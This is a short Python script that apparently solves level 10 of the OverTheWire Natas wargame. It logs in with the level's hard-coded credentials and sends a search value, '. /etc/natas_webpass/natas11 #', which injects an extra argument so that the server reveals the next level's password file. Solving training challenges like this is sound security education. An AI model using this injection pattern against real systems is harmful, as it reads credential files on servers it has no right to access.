from bs4 import BeautifulSoup as bs
import requests
import re

u='natas10'
p='nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
l=f'http://{u}.natas.labs.overthewire.org'
resp=requests.post(l,data={"needle":". /etc/natas_webpass/natas11 #","submit":"submit"},auth=(u, p))
t=resp.text
print(re.findall(r'<pre>\n(.*)\n</pre>',t)[0])
